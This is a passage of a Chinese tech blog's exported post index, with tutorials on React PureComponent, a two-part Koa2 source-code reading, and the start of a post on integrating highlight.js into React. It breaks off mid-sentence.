https://github.com/gin-gonic/gin","categories":[{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/categories/Go/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"}]},{"title":"React 中使用 PureComponent","slug":"React/React/React 中使用 PureComponent","date":"2017-09-05T01:34:58.000Z","updated":"2021-06-15T06:10:52.876Z","comments":true,"path":"/stories/2017/09/React/React/React 中使用 PureComponent/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/React/React/React 中使用 PureComponent/","excerpt":"前言在 React 15.3 里，React 提供了 React.PureComponent 来支持一些性能优化方面的，它取代了之前的 pure-render-mixin。 React.PureComponent 最重要的一个用处就是优化 React 应用，这很容易快速地实现。使用 React.PureComponent 对性能的提升是非常可观的，因为它减少了应用中的渲染次数。","text":"前言在 React 15.3 里，React 提供了 React.PureComponent 来支持一些性能优化方面的，它取代了之前的 pure-render-mixin。 React.PureComponent 最重要的一个用处就是优化 React 应用，这很容易快速地实现。使用 React.PureComponent 对性能的提升是非常可观的，因为它减少了应用中的渲染次数。 阅读源码PureComponent 相关的代码在： 123react\\lib\\ReactBaseClasses.jsreact\\lib\\shallowCompare.jsreact\\lib\\ReactComponentWithPureRenderMixin.js 其中与 shouldComponentUpdate 相关的在 shallowCompare 与 ReactComponentWithPureRenderMixin，其它可以不用看。 在 ReactComponentWithPureRenderMixin 里可以看到，PureComponent 对 shouldComponentUpdate 进行了处理，做了一个浅比较。 12345var ReactComponentWithPureRenderMixin = &#123; shouldComponentUpdate: function (nextProps, nextState) &#123; return shallowCompare(this, nextProps, nextState); &#125;&#125;; 在来看看浅比较： 123456var shallowEqual = require('fbjs/lib/shallowEqual');function shallowCompare(instance, nextProps, nextState) &#123; return !shallowEqual(instance.props, nextProps) || !shallowEqual(instance.state, nextState);&#125; 再去看看 shallowEqual 的算法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445// 判断 x, y 是否相等function is(x, y) &#123; // SameValue algorithm if (x === y) &#123; // Steps 1-5, 7-10 // Steps 6.b-6.e: +0 != -0 // Added the nonzero y check to make Flow happy, but it is redundant return x !== 0 || y !== 0 || 1 / x === 1 / y; &#125; else &#123; // Step 6.a: NaN == NaN return x !== x &amp;&amp; y !== y; &#125;&#125;// 浅比较function shallowEqual(objA, objB) &#123; if (is(objA, objB)) &#123; // 两个对象的引用地址相同 return true; &#125; if (typeof objA !== 'object' || objA === null || typeof objB !== 'object' || objB === null) &#123; return false; &#125; var keysA = Object.keys(objA); var keysB = Object.keys(objB); if (keysA.length !== keysB.length) &#123; // 长度不同 return false; &#125; // Test for A's keys different from B. for (var i = 0; i &lt; keysA.length; i++) &#123; if (!hasOwnProperty.call(objB, keysA[i]) || !is(objA[keysA[i]], objB[keysA[i]])) &#123; return false; &#125; &#125; return true;&#125; 原理分析PureComponent改变了生命周期方法shouldComponentUpdate，并且它会自动检查组件是否需要重新渲染。这时，只有 PureComponent 检测到state或者props发生变化时，PureComponent才会调用 render方法，因此，你不用手动写额外的检查，就可以在很多组件中改变 state， 例如： 123if (this.state.someVal !== computedVal) &#123; this.setState(&#123; someVal: computedVal &#125;)&#125; 根据 React 源码，如果组件是纯组件（Pure Component），那么一下比较是很容易理解的： 12345if (this._compositeType === CompositeTypes.PureClass) &#123; shouldUpdate = !shallowEqual(prevProps, nextProps) || !shallowEqual(inst.state, nextState);&#125; PureComponent 只会“浅”检查组件的 props 和 state，这就意味着嵌套对象和数组是不会被比较的。 深比较操作是非常昂贵的，同时如果这个组件还是纯组件（PureComponent），那么深比较将会更浪费。另外，你也可以使用 shouldComponentUpdate 来手动确定组件是否需要重新渲染。 最简单的方式就是根据特点直接比较 props 或 state： 123shouldComponentUpdate(nextProps, nextState) &#123; return nextProps.user.id === props.user.id;&#125; 使用 PureComponent使用 PureComponent 非常简单，只需要继承 PureComponent 即可。 1234567891011import React, &#123; PureComponent &#125; from 'react';export default class App extends PureComponent &#123; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Hello world!&lt;/h1&gt; &lt;/div&gt; ) &#125;&#125; 需要注意的地方PureComponent 并不是随便使用就可以达到效果的，主要由 js 引起的坑，比如： 12[1, 2] == [1, 2]; // false&#123;a: 1&#125; == &#123;a: 1&#125;; // false 场景什么场景需要使用 PureComponent？我们来做一个实验。 先是使用 Component 而不使用 PureComponent。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647let itemAllRenderCount = 0;class Item extends Component &#123; render() &#123; const &#123; text &#125; = this.props; itemAllRenderCount++; console.log('我渲染了：' + text); return ( &lt;li&gt; &lt;span&gt;&#123;text&#125;&lt;/span&gt; &lt;/li&gt; ); &#125;&#125;export default class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; list: [], &#125;; &#125; addText = () =&gt; &#123; this.setState(&#123; list: this.state.list.concat([&#123; text: Mock.Random.name() &#125;]), &#125;); &#125; render() &#123; const &#123; list &#125; = this.state; console.log('Item 全部渲染次数：' + itemAllRenderCount); return ( &lt;div&gt; &lt;button onClick=&#123;this.addText&#125;&gt;添加&lt;/button&gt; &lt;br /&gt; &lt;ul&gt; &#123;list.map((item, index) =&gt; ( &lt;Item text=&#123;item.text&#125; key=&#123;index&#125; /&gt; ))&#125; &lt;/ul&gt; &lt;/div&gt; ); &#125;&#125; 当你添加到 10 个元素时，发现全部的 Item 总共渲染了 45 次，这是非常糟糕的。此刻，把 Item 类改成继承 PureComponent。还是添加 10 个元素，所有的 Item 总共只渲染了 10 次。如果 Item 组件非常多节点，不使用 PureComponent 会是明显存在性能问题。 浅比较的缺陷因为 PureComponent 是会进行浅比较的。所以，只要数组的引用地址不改变，它就不会重新渲染。 这样，应该选择直接切断引用关系。 123456789const a = [1, 2, 3];const b = a;a.push(4); // push 并不能切断引用console.log(b); // [1, 2, 3, 4]// 使用 concata = a.concat([5]);console.log(a); // [1, 2, 3, 4, 5]console.log(b); // [1, 2, 3, 4] 同时，可以避免在父组件里做这样一件事情。 12345678render() &#123; const &#123; posts &#125; = this.props; const top = posts.sort((a, b) =&gt; a.like - b.like).slice(0, 10); return ( // ... )&#125; top 每次都会是新的内存地址，所以要必要考虑这样做是否会影响 PureComponent。 引用改变PureComponent 节约了我们的时间，避免了多余的代码。 那么，掌握如何正确使用它是非常重要的，否则如果使用不当，它就无法发挥作用。因为 PureComponent 仅仅是浅比较（shadow comparison），所以改变组件内部的 props 或者 state，它将不会发挥作用。 如果 props 设置直接为对象或数组，会导致 PureComponent 一直返回 true： 1234567&lt;Entity style=&#123;&#123; color: 'green' &#125;&#125; values=&#123;[1, 2, 3]&#125; onChang=&#123;e =&gt; &#123; console.log(e); &#125;&#125; /&gt; 在上面的三个属性都会导致 PureComponent 一直返回 true。 为什么会这样呢？因为，在每次 render 的时候，style 都会丢弃之前的对象并重新创建对象导致 props 的引用改变。同理 values 会重新创建一个数组，onChang 会重新创建一个匿名函数。 为什么保留 props 引用，而不影响 PureComponent 的判断，需要： 12345&lt;Entity style=&#123;styles.entity&#125; values=&#123;this.values&#125; onChang=&#123;this.onChang&#125; /&gt; 回调函数导致失效对于一个组件来说，回调函数是 props。巧合属于浅比较里面。 如果是这样写请注意了，你可以会在此处滑倒，这个组件每次都会重新渲染，还不如继承 Component。 1234567list.map((user, index) =&gt; ( &lt;Item key=&#123;`item-$&#123;user.id&#125;`&#125; name=&#123;user.name&#125; onClick=&#123;e =&gt; this.like(user.id)&#125; /&gt;)) 首先，这里有三个 props，任何一个 props 的改变都会导致 Item 组件重新渲染。而问题在于每次父组件渲染时，onClick 的回调函数是一个匿名的函数，每次都会重新申请一块内存地址。也就是说 onClick 每次都会变，即使回调函数执行的内容是相同的。 在这里需要一个 user.id 作为 上下文，那么如何解决？ 12345&lt;Item name=&#123;user.name&#125; id=&#123;user.id&#125; onClick=&#123;this.like&#125; /&gt; 把 上下文 作为 props 传递个 Item 组件。 在 Item 组件里的 onClick 做一下处理。（这里非常重要） 123456789101112import React, &#123; PureComponent &#125; from 'react';export default class Item extends PureComponent &#123; render() &#123; const &#123; onClick, name, id &#125; = this.props; return ( &lt;p onClick=&#123;e =&gt; onClick(id)&#125;&gt; &#123;name&#125; &lt;/p&gt; ) &#125;&#125; 这样，这个 Item 组件 PureComponent 的效果就不会失效了。 深比较虽然说深比较昂贵，但是如果 React 重新渲染组件的时间比深比较还要慢，那么深比较，是很值得去使用的，这取决于特定的环境。 深比较比较通常需要递归的执行，能够直接判断两个对象是否相等。 1234const a = &#123; id: 1 &#125;, b = &#123; id: 1 &#125;;console.log(a === b); // falseconsole.log(deepEql(a, b)); // false 如何做一个深比较，一般我们编写一个基础类，就叫 deep-component 吧。 1234567891011import React, &#123; Component &#125; from 'react';import deepEql from 'deep-eql';export default class DeepComponent extends Component &#123; shouldComponentUpdate(nextProps, nextState) &#123; const f1 = !deepEql(nextState, this.state); // true 是为不同，需要更新 if (f1 === true) return true; const f2 = !deepEql(nextProps, this.props); return f2; &#125;&#125; 这个深比较先是比较了 state 的差异性，再去比较 props 的差异性，而不是两个都比较完成后，再去决定是否重新渲染，这样做可以节省一些时间。 使用的时候，只需要继承这个组件即可。 总结事实上，如果你已经意识到 shallowEqual 和 js references 的特性，过渡到 PureComponent 是相当容易的。正常情况下，迁移的方式非常简单，就像改变组件继承的基类，从 Component 到 PureComponent。这样不仅能平滑过渡，甚至可以提升性能。但是，需要做一些调节，才能让 PureComponent 发挥真正的作用。 注意：在纯组件有子组件的时候，所有基于 this.context 改变的子组件，在 this.context 改变时将不会重新渲染，除非在父组件中声明 contextTypes。 参考资料 https://60devs.com/pure-component-in-react.html","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Koa2 源码阅读（二）","slug":"Nodejs/Koa/Koa2 源码阅读（二）","date":"2017-09-03T02:34:26.000Z","updated":"2021-06-15T06:10:52.835Z","comments":true,"path":"/stories/2017/09/Nodejs/Koa/Koa2 源码阅读（二）/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/Nodejs/Koa/Koa2 源码阅读（二）/","excerpt":"前言上节（Koa2 源码阅读（一））粗略了阅读了 Koa 的 lib\\application.js 文件，收获很大。这节把剩下了一次性看完它，内容还是比较多的。","text":"前言上节（Koa2 源码阅读（一））粗略了阅读了 Koa 的 lib\\application.js 文件，收获很大。这节把剩下了一次性看完它，内容还是比较多的。 contextcontext 上下文的意思，可以理解为this。 先来看看context.js 依赖了那些模块： 1234const createError = require('http-errors'); // 创建 HTTP 错误对象const httpAssert = require('http-assert'); // 用状态代码断言const delegate = require('delegates'); // 委托方法和访问器到对象上const statuses = require('statuses'); // http 状态（status）工具 在 context 里，前面基本都是一些错误处理，到了 delegate 这里，进行了一大堆的属性绑定。 1234567891011121314151617delegate(proto, 'response') .method('attachment') .method('redirect') .method('remove') .method('vary') .method('set') .method('append') .method('flushHeaders') .access('status') .access('message') .access('body') .access('length') .access('type') .access('lastModified') .access('etag') .getter('headerSent') .getter('writable'); 上面的代码就是把 proto.body（也就是 ctx.body）绑定到了 response.body 上。相当于： 1proto.response.body = proto.body; 而response在那里？ response 就是 proto.response 也就是 response.js。也就是说在 response.js 里使用 this，这个this，它指向的是 proto.response。在 application.js 里可以找到它的身影： 1234// application.js -&gt; 150 行const context = Object.create(this.context);const request = context.request = Object.create(this.request);const response = context.response = Object.create(this.response); 也就是说，当使用ctx.body 时，实际上是使用 ctx.response.body，而 body 最后会在 application -&gt; respond里被使用： 123456// application.js -&gt; 232 行body = JSON.stringify(body);if (!res.headersSent) &#123; ctx.length = Buffer.byteLength(body);&#125;res.end(body); 这样 context.js 的工作就已经完毕了，它的任务主要是进行属性的绑定。 requestrequest文件里，负责请求相关的 api。 先来看看 request 里用依赖了那些模块： 123456789const URL = require('url').URL; // Nodejs URL 模块const net = require('net'); // Nodejs net 模块const contentType = require('content-type'); // 创建并解析 HTTP Content-Type 头const stringify = require('url').format; // 将 url 对象转为字符串const parse = require('parseurl'); // 解析一个带有记忆的 URLconst qs = require('querystring'); // get quert 解析const typeis = require('type-is'); // 判断 content-typeconst fresh = require('fresh'); // HTTP 响应新鲜度测试？const only = require('only'); // 对象白名单 在 request.js 里引入了很多与 http request 相关的模块，包括了 url 解析，query 解析等。 request.js 只导出了一个对象，并且使用了 ES6 的 get，set 函数对属性进行 get，set 的绑定，如果是 ES5，那就需要使用 Object.defineProperty() 进行设置 get，set 函数。 123456789module.exports = &#123; set header(val) &#123; this.req.headers = val; &#125;, get headers() &#123; return this.req.headers; &#125;, // ...&#125; 注意到的是： set 后，并没有返回 this，所以并不能像 JQuery 那样链式调用。 设置时，把数值设置在 this.req 上，那么 this.req 是什么？ 实际上 this.req 是在 application.js 那里被初始化： 12// application.js -&gt; 153 行context.req = request.req = response.req = req; 总的来说，request.js 里对常用的 http request 属性进行绑定。 responseresponse.js 文件里的内容与 request.js 类似，大致是对 http response 进行 get, set 绑定。 先来看看它的依赖模块： 12345678910111213const contentDisposition = require('content-disposition'); // 创建并解析 Content-Dispositionconst ensureErrorHandler = require('error-inject'); // 在流中注入错误侦听器const getType = require('mime-types').contentType; // 判断 content-type 类型const onFinish = require('on-finished'); // 当请求关闭，完成或错误时执行回调const isJSON = require('koa-is-json'); // 判断是否是 jsonconst escape = require('escape-html'); // 用于 HTML 的转义字符串const typeis = require('type-is').is; // 判断 content 类型const statuses = require('statuses'); // http 状态（status）工具const destroy = require('destroy'); // 确保流被释放const assert = require('assert'); // Nodejs 断言库const extname = require('path').extname; // Nodejs path 模块const vary = require('vary'); // 设置 http headerconst only = require('only'); // 对象白名单 response 的依赖大多是与 http 设置相关的。 要说的是this.body部分： body 的获取非常简单，就是返回 this._body： 123get body() &#123; return this._body;&#125; 那么 this._body 在那里设置？ 在 set 函数里设置，默认是 undefined. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051set body(val) &#123; const original = this._body; this._body = val; if (this.res.headersSent) return; // no content if (null == val) &#123; if (!statuses.empty[this.status]) this.status = 204; this.remove('Content-Type'); this.remove('Content-Length'); this.remove('Transfer-Encoding'); return; &#125; // set the status if (!this._explicitStatus) this.status = 200; // set the content-type only if not yet set const setType = !this.header['content-type']; // string if ('string' == typeof val) &#123; if (setType) this.type = /^\\s*&lt;/.test(val) ? 'html' : 'text'; this.length = Buffer.byteLength(val); return; &#125; // buffer if (Buffer.isBuffer(val)) &#123; if (setType) this.type = 'bin'; this.length = val.length; return; &#125; // stream if ('function' == typeof val.pipe) &#123; onFinish(this.res, destroy.bind(null, val)); ensureErrorHandler(val, err =&gt; this.ctx.onerror(err)); // overwriting if (null != original &amp;&amp; original != val) this.remove('Content-Length'); if (setType) this.type = 'bin'; return; &#125; // json this.remove('Content-Length'); this.type = 'json';&#125;, 它做了几件事情： 如果没有 http content 没有内容，它会把一些 http 属性删除 如果没有设置过状态码，默认会帮你设置为 200。this._explicitStatus 是一个标志量，设置后为 true 如果没有设置 content-type，它会根据 body 来自动设置 如果 body 是 string 类型，设置 content-type 为 html/text 如果 body 是 Buffer 类型，设置 content-type 为 bin 类型 如果 body 是 Stream 类型，它会附加一个监听器来监听请求的完成 剩下的 设置 content-type 为 json，这也就是为什么 body 设置为对象时，会响应为 json 总结Koa 定义了 request, response 相关的 api，把更多的留给了第三方去解决。编写 Koa 应用，可以根据 use 来不同的组合使用中间件。Koa 不在内核方法中绑定任何中间件，它仅仅提供了一个轻量优雅的函数库，使得编写 Web 应用变得得心应手。这也是 Koa 比 Express 好的原因。 在 Koa 的源码里作者灵活的使用了很多非常有用的模块，才足以开发出 Koa。 所以可以得出的结论是：尝试站在巨人的肩膀上，学会如何灵活使用工具（哈哈）。","categories":[{"name":"Koa","slug":"Koa","permalink":"http://me.lizhooh.com/categories/Koa/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Koa","slug":"Koa","permalink":"http://me.lizhooh.com/tags/Koa/"}]},{"title":"Koa2 源码阅读（一）","slug":"Nodejs/Koa/Koa2 源码阅读（一）","date":"2017-09-02T02:34:26.000Z","updated":"2021-06-15T06:10:52.835Z","comments":true,"path":"/stories/2017/09/Nodejs/Koa/Koa2 源码阅读（一）/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/Nodejs/Koa/Koa2 源码阅读（一）/","excerpt":"前言提升对某个框架的认识度与理解度，最快的捷径就是阅读并深入研究其源码。也就只有阅读了源码后才知道其（Koa），从运行到结束到底做了什么。 Koa是一个非常简洁的 Web 框架，其源码也是少之又少，只有 1000+ 行代码，通过阅读其源码不到可以学习到 Koa 的运行流程还能，学习到很多的设计模式，优秀的编程方式。","text":"前言提升对某个框架的认识度与理解度，最快的捷径就是阅读并深入研究其源码。也就只有阅读了源码后才知道其（Koa），从运行到结束到底做了什么。 Koa是一个非常简洁的 Web 框架，其源码也是少之又少，只有 1000+ 行代码，通过阅读其源码不到可以学习到 Koa 的运行流程还能，学习到很多的设计模式，优秀的编程方式。 下面就开始，从零开始阅读 Koa 的源码。 开始先从 Koa 的仓库里通过 git clone 到本地，目前的版本为 v2.3 1git clone https://github.com/koajs/koa.git 文件结构阅读源码的第一步是查询源文件，一般都放在src或着lib里面。 Koa 的源码放在lib里，里面有四个文件： 12345678910111213141516171819koa├── benchmarks // 基准测试├── docs // 文档，有什么不明白，来这里查看。├── test // 测试文件，可以学习如何进行单元测试├── lib // 源码│ ├── application.js // 应用│ ├── context.js // 上下文│ ├── request.js // 请求│ └── response.js // 响应├── .editorconfig // 编辑器配置├── .eslintrc // eslint├── .gitignore├── .travis.yml├── AUTHORS // 贡献者├── CODE_OF_CONDUCT.md├── History.md // 更新日志文件├── LICENSE // 开源协议├── package.json└── Readme.md // 说明文件 一个成熟的开源项目，大概也就这些文件结构了。 入口文件koa 仅对 Nodejs 的 request, response 进行封装，其它更多都留给了中间件去处理，这样做是为了更好的灵活性。先从那个文件开始，看呢？一般，先阅读入口文件，才去阅读其它文件。可以从package.json里找到入口文件（application.js）： 12345678910111213&#123; \"name\": \"koa\", \"version\": \"2.3.0\", \"description\": \"Koa web app framework\", \"main\": \"lib/application.js\", \"scripts\": &#123; \"test\": \"jest --forceExit\", \"test-cov\": \"npm run test -- --coverage\", \"lint\": \"eslint benchmarks lib test --fix\", \"bench\": \"make -C benchmarks\" &#125;, ...&#125; 实际上 package 里可以知道有很多信息，记得千万不要忽视了 package.json 文件。 application.js先来看看 application 里写的是什么。打开后可以看到有很多依赖文件，下面就来分析一下依赖文件。 依赖模块在 application 文件里，一共依赖了 18 个模块。 12345678910111213141516171819// 判断是否是 generator 函数const isGeneratorFunction = require('is-generator-function');const debug = require('debug')('koa:application'); // dubug 模式const onFinished = require('on-finished'); // 侦听器：当 HTTP 请求关闭，完成或错误时执行回调。const response = require('./response'); // 响应相关 [lib\\response.js]const compose = require('koa-compose'); // 合并给定的中间件，并返回一个新的中间件const isJSON = require('koa-is-json'); // 检查 body 是否是 jsonconst context = require('./context'); // 上下文相关 [lib\\context.js]const request = require('./request'); // 请求相关 [lib\\request.js]const statuses = require('statuses'); // http 状态（status）工具const Cookies = require('cookies'); // 一个用于获取和设置 HTTP Cookie 的模块const accepts = require('accepts'); // 判断 http content accepts 内容const Emitter = require('events'); // Nodejs 的事件模块const assert = require('assert'); // Nodejs 的断言模块const Stream = require('stream'); // Nodejs 的流模块const http = require('http'); // Nodejs 的 http 模块const only = require('only'); // 返回对象的白名单属性const convert = require('koa-convert'); // 将 generator yield 转化为 async awaitconst deprecate = require('depd')('koa'); // 废弃的 Api 俗话说，要站在巨人的肩膀上。Koa 也不例外，在依赖里有很多都不知道的模块，真是没白看。之前一直想隐蔽对象的某个属性，比如说：在 mongodb 取出的数据，有部分保密数据，并不希望返回给用户，那么就可以使用only。 12345678const obj = &#123; name: 'tobi', last: 'holowaychuk', _id: '12345'&#125;;const user = only(obj, 'name last email');// &#123; name: 'tobi', last: 'holowaychuk' &#125; 总的来说，用到的 Nodejs 模块，主要是 HTTP 与 Stream，其它很多都是工具类模块。 Application 类在 application 文件里只有一个类：Application，也就是 Koa 类。 Koa 继承了 Emitter 类，这是许多框架都会选择继承的方式，其中主要原因是：Nodejs 是基于事件驱动的。 先来看看构造函数： 1234567891011constructor() &#123; super(); this.proxy = false; // 代理 this.middleware = []; // 中间件队列 this.subdomainOffset = 2; // 表示忽略的子域名数量，默认为2 this.env = process.env.NODE_ENV || 'development'; // 默认是 development 模式 this.context = Object.create(context); // Object.create: 使用指定的原型对象及其属性去创建一个新的对象 this.request = Object.create(request); this.response = Object.create(response);&#125; 构造函数非常简单，无非就是做了几个变量的初始化，下面再看看它的方法。 公有方法： listen toJSON inspect use callback 私有方法： createContext onerror listenlisten 函数，只是代理了 http 模块的 listen，把接收到的参数都传给了 http.listen。可以看出创建的 http server 回调函数在 this.callback 里进行。 12345listen(...args) &#123; debug('listen'); const server = http.createServer(this.callback()); return server.listen(...args);&#125; callbackcallback 是一个高阶函数，它返回了一个 http request 处理函数。 callback 做了几件事情： 合并所有中间件 如果，listeners 有错误，就触发错误事件，listeners 是继承与 Emitter 的方法 返回一个 http request 处理函数，设定 statusCode 默认是 404 使用 this.createContext 创建上下文 在 respond 里处理 response ctx 作为参数绑定在所有中间件里，发生错误时统一触发 onerror 12345678910111213141516callback() &#123; const fn = compose(this.middleware); // 1. if (!this.listeners('error').length) this.on('error', this.onerror); // 2. const handleRequest = (req, res) =&gt; &#123; res.statusCode = 404; // 3. const ctx = this.createContext(req, res); // 4. const onerror = err =&gt; ctx.onerror(err); const handleResponse = () =&gt; respond(ctx); // 5. onFinished(res, onerror); return fn(ctx).then(handleResponse).catch(onerror); // 6. &#125;; return handleRequest;&#125; createContextcreateContext 是一个私有方法，用来创建上下文。 createContext 做的事情就是把 req, res 绑定到一个 ctx 对象里。 123456789101112131415161718192021createContext(req, res) &#123; const context = Object.create(this.context); const request = context.request = Object.create(this.request); const response = context.response = Object.create(this.response); context.app = request.app = response.app = this; // 在中间里，使用 ctx.app 来应用 this context.req = request.req = response.req = req; // 绑定了 http request callback -&gt; req context.res = request.res = response.res = res; // 绑定了 http request callback -&gt; res request.ctx = response.ctx = context; request.response = response; // context.response = response; 引用特性 response.request = request; // context.request = request; context.originalUrl = request.originalUrl = req.url; context.cookies = new Cookies(req, res, &#123; // 创建 cookies keys: this.keys, secure: request.secure &#125;); request.ip = request.ips[0] || req.socket.remoteAddress || ''; context.accept = request.accept = accepts(req); context.state = &#123;&#125;; return context;&#125; useuse是一个非常重要的方法，用来使用中间件。 use做了几件事情： 判断参数不是 function，抛出错误 判断参数是 generator 函数，抛出过时警告，并把它转换成 async 函数 把参数，扔进中间件队列里 123456789101112use(fn) &#123; if (typeof fn !== 'function') throw new TypeError('middleware must be a function!'); if (isGeneratorFunction(fn)) &#123; deprecate('Support for generators will be removed in v3. ' + 'See the documentation for examples of how to convert old middleware ' + 'https://github.com/koajs/koa/blob/master/docs/migration.md'); fn = convert(fn); &#125; debug('use %s', fn._name || fn.name || '-'); this.middleware.push(fn); return this;&#125; respondrespond是用来处理 response 的。 respond做了几件事情： 如果允许绕过 koa，则不处理 如果不在写入，则不处理 如果状态码为空，则 body 设置为空，并响应空值 如果请求方法为：HEAD（只请求页面的首部），若响应头没有被设置时，设置其 length，并响应空值 如果 body 为空，则设置 body 为 message 或 状态码，若响应头没有被设置时，设置 type，length 如果 body 是 Buffer，就响应对应值 如果 body 是 string，就响应对应值 如果 body 是 stream 的一个示例，就接上管道（pipe） 其余转为 json 对象，再响应 其中：res.headersSent：返回一个布尔值（只读）。如果响应头已被发送则为 true，否则为 false。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546function respond(ctx) &#123; // allow bypassing koa [允许绕过 koa] if (false === ctx.respond) return; const reswritable = ctx.res; if (!ctx.writable) return; let body = ctx.body; const code = ctx.status; // ignore body if (statuses.empty[code]) &#123; // strip headers ctx.body = null; return res.end(); &#125; if ('HEAD' == ctx.method) &#123; if (!res.headersSent &amp;&amp; isJSON(body)) &#123; ctx.length = Buffer.byteLength(JSON.stringify(body)); &#125; return res.end(); &#125; // status body if (null == body) &#123; // null == null, null == undefined body = ctx.message || String(code); if (!res.headersSent) &#123; ctx.type = 'text'; ctx.length = Buffer.byteLength(body); &#125; return res.end(body); &#125; // responses if (Buffer.isBuffer(body)) return res.end(body); if ('string' == typeof body) return res.end(body); if (body instanceof Stream) return body.pipe(res); // body: json body = JSON.stringify(body); if (!res.headersSent) &#123; ctx.length = Buffer.byteLength(body); &#125; res.end(body);&#125; next ?等等，看到这里怎么没看见 next ?，koa 的中间件是如何使用 next，从而跳到另一个中间件的？ 1234app.use(async (ctx, next) =&gt; &#123; // ... await next();&#125;) 很明显，next 隐藏在 koa-compose 这个模块里，koa-compose 也是 koa 作者写的，它主要是用来执行中间件。 koa-compose做了几件事情： 判断参数是否是函数数组，否则抛出异常。 返回一个高阶函数，高阶函数返回一个 dispatch 闭包函数 如果一个中间件里有 2 个await next()，会报错：next() called multiple times 用 index 标识，中间件执行位置 在 next 里，调用下一个中间件：dispatch(i + 1) 把 fn 放到 Promise.resolve 里，就说明 await next() 执行的是 fn 代码，导致洋葱执行过程 立即返回处于 resolve 状态 promise 实例，以便后续逻辑继续执行，此处形成一种递归的方式 1234567891011121314151617181920212223242526272829303132333435363738394041/** * Compose `middleware` returning * a fully valid middleware comprised * of all those which are passed. * * @param &#123;Array&#125; middleware * @return &#123;Function&#125; * @api public */function compose(middleware) &#123; // 1. if (!Array.isArray(middleware)) throw new TypeError('Middleware stack must be an array!') for (const fn of middleware) &#123; if (typeof fn !== 'function') throw new TypeError('Middleware must be composed of functions!') &#125; /** * @param &#123;Object&#125; context * @return &#123;Promise&#125; * @api public */ return function (context, next) &#123; // 2. // last called middleware # let index = -1 return dispatch(0) function dispatch(i) &#123; // 3. if (i &lt;= index) return Promise.reject(new Error('next() called multiple times')) index = i // 4. let fn = middleware[i] if (i === middleware.length) fn = next if (!fn) return Promise.resolve() // 7. try &#123; // 5. return Promise.resolve(fn(context, function next() &#123; return dispatch(i + 1) // 6. &#125;)) &#125; catch (err) &#123; return Promise.reject(err) &#125; &#125; &#125;&#125; 源码非常的简单，实现的功能就是将所有的中间件串联起来。koa-compose 把所有的中间件串联起来，让它能够按照洋葱模型去执行。 关键的在于 Promise.resolve，其神奇之处在于造成一个洋葱模型的递归效果。 注意：一个中间件只能有一个 next。 总结application.js 主要的工作是创建一个 Koa 类，并进行一些初始化工作，把 http server req, res 绑定到自己的属性上。代码质量很好，每一个函数都通俗易懂，每一步都非常清晰。除了这些，还学习到了良好的编程规格，比如通过 @param 指定参数类型，@return 指定返回值。这样做的好处，除了规范，还可以为编辑器提供智能提示的依据。 123456789/** * Shorthand for: * * http.createServer(app.callback()).listen(...) * * @param &#123;Mixed&#125; ... * @return &#123;Server&#125; * @api public */ 下一节研究 context.js，request.js，resource.js 文件。","categories":[{"name":"Koa","slug":"Koa","permalink":"http://me.lizhooh.com/categories/Koa/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Koa","slug":"Koa","permalink":"http://me.lizhooh.com/tags/Koa/"}]},{"title":"React 集成 highlight","slug":"React/React/React 集成 highlight","date":"2017-09-01T02:14:58.000Z","updated":"2021-06-15T06:10:52.879Z","comments":true,"path":"/stories/2017/09/React/React/React 集成 highlight/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/React/React/React 集成 highlight/","excerpt":"前言highlight.js是一个很出名的代码高亮库，基本现在的代码高亮功能都可以使用 highlight 来制作（本博客的代码高亮是使用 highlight）。highlight需要一个真实的 DOM 节点才能渲染，那么在 React 是如何集成 highlight ?下面介绍 highlight 在几个方面的使用，最后介绍如何在 React 上集成 highlight。","text":"前言highlight.js是一个很出名的代码高亮库，基本现在的代码高亮功能都可以使用 highlight 来制作（本博客的代码高亮是使用 highlight）。highlight需要一个真实的 DOM 节点才能渲染，那么在 React 是如何集成 highlight ?下面介绍 highlight 在几个方面的使用，最后介绍如何在 React 上集成 highlight。 使用 highlight对于 highlight 来说，只有你扔给他一个字符串，就可以得到解析后的数据，这个过程没有任何的依赖，是一个纯函数。 安装： 1npm install --save highlight.js # highlight 的包名是 highlight.js 使用它分两步： 引入 css 文件 找到所有的 &lt;pre&gt; &lt;code&gt; 标签进行解析 12345$(document).ready(function() &#123; $('pre code').each(function(i, block) &#123; hljs.highlightBlock(block); &#125;);&#125;); 在 Web Workers 上解析如果代码多，大量的计算会冻结 UI 的渲染，这时可以选择在 Web Workers 上进行解析数据，前面说了 highlight 解析是一个纯函数的过程，没有任何依赖。 在 main.js 12345678910window.addEventListener('load', function() &#123; let code = document.querySelector('#code'); let worker = new Worker('worker.js'); worker.onmessage = function(event) &#123; // 完成了 code.innerHTML = event.data; // 全部完成 worker.terminate(); &#125; worker.postMessage(code.textContent);&#125;) 在 worker.js: 123456onmessage = function(event) &#123; importScripts('/highlight.pack.js'); let hljs = self.hljs; let result = hljs.highlightAuto(event.data); postMessage(result.value); // 完成了&#125; 在 Nodejs 